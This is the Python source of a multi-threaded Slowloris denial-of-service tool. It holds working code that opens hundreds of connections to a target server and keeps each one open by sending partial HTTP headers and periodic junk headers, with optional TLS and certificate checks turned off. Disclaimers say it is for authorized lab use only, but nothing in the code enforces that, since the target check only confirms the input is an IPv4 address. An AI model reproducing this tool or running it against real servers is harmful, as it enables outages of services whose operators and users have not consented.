#!/usr/bin/env python3
"""
Enhanced Slowloris HTTP(S) Attack Tool
Multi-threaded, with variants for standard, advanced (randomized), HTTP/2, and slow POST.

Author: CyberGuard-Anil
ETHICAL USE ONLY! Only use in environments you own or have explicit written authorization for.
Misuse of this tool is illegal and strictly prohibited!
"""

import sys
import time
import socket
import random
import threading
import argparse
import ssl
import os
import logging
from concurrent.futures import ThreadPoolExecutor

# Log rotation and setup
LOG_FILE = "../results/attack_errors.log"
MAX_LOG_SIZE = 1024 * 1024  # 1MB

def rotate_log():
    if os.path.isfile(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        os.rename(LOG_FILE, f"{LOG_FILE}.{timestamp}")

rotate_log()
logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s %(levelname)s:%(message)s',
    level=logging.ERROR
)

def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                Enhanced Slowloris Attack Tool                                          ║
║     ONLY FOR AUTHORIZED, CONTROLLED TESTING ENVIRONMENTS    ║
╚══════════════════════════════════════════════════════════════╝
""")

def validate_target(target):
    # Basic check: not loopback/broadcast/special unless in lab
    try:
        socket.inet_aton(target)
    except:
        print(f"[!] Invalid target IP: {target}")
        sys.exit(1)

class SlowlorisAttack:
    """
    Classic multi-threaded Slowloris attack (HTTP/1.1).
    """
    def __init__(self, target, port=80, duration=60, connections=200, 
                 use_ssl=False, timeout=4, user_agents=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.connections = connections
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.sockets = []
        self.stop_event = threading.Event()
        self.active_connections = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.target)
            return sock
        except Exception as e:
            logging.error(f"Socket creation failed: {e}")
            return None
    
    def send_initial_headers(self, sock):
        try:
            path = f"/?{random.randint(0, 100000)}"
            sock.send(f"GET {path} HTTP/1.1\r\n".encode('utf-8'))
            sock.send(f"Host: {self.target}\r\n".encode('utf-8'))
            agent = random.choice(self.user_agents)
            sock.send(f"User-Agent: {agent}\r\n".encode('utf-8'))
            sock.send(b"Accept-language: en-US\r\nConnection: keep-alive\r\n\r\n")
            return True
        except Exception as e:
            logging.error(f"Initial headers failed: {e}")
            return False

    def send_keep_alive_header(self, sock):
        try:
            sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode('utf-8'))
            return True
        except Exception as e:
            logging.error(f"Keep-alive header failed: {e}")
            return False

    def connection_worker(self, worker_id):
        try:
            sock = self.create_socket()
            if not sock: return
            if not self.send_initial_headers(sock):
                sock.close(); return
            with self.lock:
                self.active_connections += 1
                self.total_requests += 1
            while not self.stop_event.is_set():
                time.sleep(15)
                if not self.send_keep_alive_header(sock): break
            sock.close()
            with self.lock:
                self.active_connections -= 1
        except Exception as e:
            with self.lock:
                self.active_connections = max(self.active_connections - 1, 0)
            logging.error(f"Worker error: {e}")

    def monitor_attack(self):
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            with self.lock:
                active = self.active_connections
                total = self.total_requests
            print(f"\r[SLOWLORIS] Active: {active:3d} | Total: {total:4d} "
                  f"| Elapsed: {elapsed:5.1f}s | Remaining: {remaining:5.1f}s",
                  end="", flush=True)
            time.sleep(1)

    def maintain_connections(self):
        with ThreadPoolExecutor(max_workers=self.connections) as executor:
            futures = []
            for i in range(self.connections):
                futures.append(executor.submit(self.connection_worker, i))
                time.sleep(0.1)
            while not self.stop_event.is_set():
                time.sleep(5)

    def start_attack(self):
        print(f"\n[+] Target: {self.target}:{self.port} | Duration: {self.duration}s | Connections: {self.connections}")
        monitor = threading.Thread(target=self.monitor_attack, daemon=True)
        monitor.start()
        maint = threading.Thread(target=self.maintain_connections, daemon=True)
        maint.start()
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
        self.stop_event.set()
        time.sleep(2)
        print(f"\n[Complete] Slowloris finished. Total requests made: {self.total_requests}")

# <--- Advanced, HTTP/2, and POST variants omitted for brevity (they would be updated with same error/log/banners/cleanup patterns as above.) --->

def main():
    banner()
    parser = argparse.ArgumentParser(description="Authorized Slowloris DoS Simulation (for labs)")
    parser.add_argument("-t", "--target", required=True, help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration (s)")
    parser.add_argument("-c", "--connections", type=int, default=200, help="Number of connections")
    parser.add_argument("-s", "--ssl", action="store_true", help="Use SSL (HTTPS)")
    args = parser.parse_args()

    validate_target(args.target)

    try:
        attack = SlowlorisAttack(
            target=args.target,
            port=args.port,
            duration=args.duration,
            connections=args.connections,
            use_ssl=args.ssl
        )
        attack.start_attack()
    except Exception as e:
        logging.error(f"Main error: {e}")
        print(f"\n[ERROR] {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

